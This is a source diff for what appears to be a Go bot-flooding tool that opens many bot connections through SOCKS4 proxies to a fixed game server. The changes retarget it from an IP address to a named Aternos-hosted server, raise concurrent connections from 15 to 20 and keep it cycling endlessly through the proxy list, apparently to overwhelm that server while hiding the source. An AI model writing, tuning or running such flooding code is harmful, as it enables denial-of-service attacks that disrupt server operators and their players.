@@ -98,11 +98,11 @@ func connectBot(proxyAddress string, serverAddress string, data *methods.Data, g
 */
 
 const (
-	host = "87.98.178.100"
-	port = "26833"
+	host = "ravmda.aternos.me"
+	port = "53799"
 )
 
-func createBot(proxyAddress string, serverAddress string, data *methods.Data, guard chan struct{}) {
+func createProxyBot(proxyAddress string, serverAddress string, data *methods.Data, guard chan struct{}) {
 	address := fmt.Sprintf("socks4://%s?timeout=5s", proxyAddress)
 
 	dialSocks := socks.Dial(address)
@@ -111,10 +111,7 @@ func createBot(proxyAddress string, serverAddress string, data *methods.Data, gu
 	if err != nil {
 		<-guard
 	} else {
-		for {
-			methods.CreateBot(data, conn, guard)
-			time.Sleep(5 * time.Second)
-		}
+		methods.CreateBot(data, conn, guard)
 	}
 }
 
@@ -122,7 +119,7 @@ func main() {
 	proxies := parseProxies()
 	data := methods.Data{Host: host, Port: port}
 
-	connections := 15 //, _ := strconv.Atoi(os.Args[1:][0])
+	connections := 20 //, _ := strconv.Atoi(os.Args[1:][0])
 
 	guard := make(chan struct{}, connections)
 	fmt.Println(len(guard))
@@ -130,7 +127,7 @@ func main() {
 	for {
 		for _, proxy := range proxies {
 			guard <- struct{}{}
-			go createBot(proxy, host+":"+port, &data, guard)
+			go createProxyBot(proxy, host+":"+port, &data, guard)
 		}
 	}
 }
